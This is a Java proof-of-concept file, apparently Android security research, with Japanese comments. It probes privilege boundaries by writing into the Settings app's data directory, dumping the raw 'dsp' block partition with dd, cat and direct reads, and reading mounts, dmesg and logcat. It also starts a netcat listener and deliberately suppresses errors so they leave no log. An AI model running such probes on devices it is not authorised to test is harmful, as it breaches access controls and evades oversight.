package com.poc;

import java.io.*;
import java.net.*;
import java.util.*;

public class Main {
    private static final String OUTPUT_DIR = "/data/data/com.android.settings/";

    public static void main(String[] args) {
        // 出力先ディレクトリを確保
        new File(OUTPUT_DIR).mkdirs();

        // 1. /dev/block/by-name/dsp の存在確認と情報収集
        execCommand("ls -l /dev/block/by-name/dsp", OUTPUT_DIR + "dsp_info.txt");
        execCommand("file /dev/block/by-name/dsp", OUTPUT_DIR + "dsp_info.txt");

        // 2. ddコマンドで先頭1MBをダンプ（権限が許せば）
        execCommand("dd if=/dev/block/by-name/dsp of=" + OUTPUT_DIR + "dsp_dump.dd bs=1M count=1 2>&1", OUTPUT_DIR + "dsp_dump_result.txt");

        // 3. catでリダイレクト（同様）
        execCommand("cat /dev/block/by-name/dsp > " + OUTPUT_DIR + "dsp_dump.cat 2>&1", OUTPUT_DIR + "dsp_dump_result.txt");

        // 4. マウント先 /vendor/dsp の内容をリスト
        execCommand("ls -lR /vendor/dsp", OUTPUT_DIR + "vendor_dsp_ls.txt");

        // 5. /proc/mounts を確認（マウント情報）
        execCommand("cat /proc/mounts | grep dsp", OUTPUT_DIR + "dsp_mount_info.txt");

        // 6. ソケット可用性テスト（TCP）
        testSocket();

        // 7. その他、ブロックデバイスの直接読み取りをJavaで試行（FileInputStream）
        tryReadBlockDevice();

        // 8. 追加の診断：dmesgやlogcatから関連メッセージを取得（オプション）
        execCommand("dmesg | grep -i dsp", OUTPUT_DIR + "dmesg_dsp.txt");
        execCommand("logcat -d | grep -i dsp", OUTPUT_DIR + "logcat_dsp.txt");
    }

    // シェルコマンド実行＆追記
    private static void execCommand(String command, String outputFile) {
        try {
            ProcessBuilder pb = new ProcessBuilder("/system/bin/sh", "-c", command);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedWriter writer = new BufferedWriter(new FileWriter(outputFile, true));
            writer.write("Command: " + command + "\n");
            writer.write("--- Output ---\n");
            String line;
            while ((line = reader.readLine()) != null) {
                writer.write(line);
                writer.newLine();
            }
            writer.write("--- End ---\n\n");
            writer.close();
            process.waitFor();
        } catch (Exception e) {
            // エラーは無視（ログに残さない）
        }
    }

    // JavaのFileInputStreamでブロックデバイスを直接読み取り
    private static void tryReadBlockDevice() {
        String path = "/dev/block/by-name/dsp";
        File dev = new File(path);
        String resultFile = OUTPUT_DIR + "java_read_block.txt";
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(resultFile, true));
             FileInputStream fis = new FileInputStream(dev)) {
            writer.write("Attempting to read first 1024 bytes from " + path + "\n");
            byte[] buffer = new byte[1024];
            int read = fis.read(buffer);
            if (read > 0) {
                writer.write("Read " + read + " bytes. First 16 bytes (hex): ");
                for (int i = 0; i < Math.min(16, read); i++) {
                    writer.write(String.format("%02X ", buffer[i]));
                }
                writer.newLine();
                writer.write("First 16 bytes (ASCII): ");
                for (int i = 0; i < Math.min(16, read); i++) {
                    char c = (char) buffer[i];
                    if (c >= 32 && c < 127) writer.write(c);
                    else writer.write('.');
                }
                writer.newLine();
            } else {
                writer.write("Read 0 bytes (EOF or empty)\n");
            }
        } catch (FileNotFoundException e) {
            appendLine(resultFile, "File not found: " + path + " (may not exist or permission denied)");
        } catch (IOException e) {
            appendLine(resultFile, "IOException: " + e.getMessage() + " (probably permission denied)");
        } catch (Exception e) {
            appendLine(resultFile, "Unexpected error: " + e.toString());
        }
    }

    // ソケット可用性テスト
    private static void testSocket() {
        String resultFile = OUTPUT_DIR + "socket_test.txt";
        // テスト1: ローカルポートに接続（127.0.0.1:1234 は netstat で LISTEN 状態）
        try (Socket socket = new Socket("127.0.0.1", 1234)) {
            appendLine(resultFile, "Socket connection to 127.0.0.1:1234 SUCCESS");
            socket.close();
        } catch (IOException e) {
            appendLine(resultFile, "Socket connection to 127.0.0.1:1234 FAILED: " + e.getMessage());
        }

        // テスト2: 自分でサーバーソケットを開いて、接続してみる
        try (ServerSocket server = new ServerSocket(0)) { // 0 で任意ポート
            int port = server.getLocalPort();
            appendLine(resultFile, "ServerSocket created on port " + port + " (SUCCESS)");
            // 別スレッドで接続試行
            final int testPort = port;
            Thread connectThread = new Thread(() -> {
                try (Socket s = new Socket("127.0.0.1", testPort)) {
                    appendLine(resultFile, "Client connected to self on port " + testPort + " SUCCESS");
                } catch (IOException e2) {
                    appendLine(resultFile, "Client self-connect FAILED: " + e2.getMessage());
                }
            });
            connectThread.start();
            // サーバーは accept を試みる（タイムアウト付きで）
            server.setSoTimeout(2000);
            try {
                Socket client = server.accept();
                appendLine(resultFile, "Server accepted incoming connection SUCCESS");
                client.close();
            } catch (SocketTimeoutException e) {
                appendLine(resultFile, "Server accept timed out (maybe client failed)");
            } catch (IOException e) {
                appendLine(resultFile, "Server accept exception: " + e.getMessage());
            }
            connectThread.join(3000);
        } catch (IOException e) {
            appendLine(resultFile, "ServerSocket creation FAILED: " + e.getMessage());
        }
        execCommand("nc -l -p 12345 &", resultFile);  // バックグラウンドでリスン
        try { Thread.sleep(500); } catch (InterruptedException ignored) {}
        execCommand("echo test | nc 127.0.0.1 12345", resultFile);
        execCommand("killall nc", resultFile); // 後片付け
    }

    private static void appendLine(String file, String line) {
        try (BufferedWriter w = new BufferedWriter(new FileWriter(file, true))) {
            w.write(line);
            w.newLine();
        } catch (IOException ignored) {}
    }
}
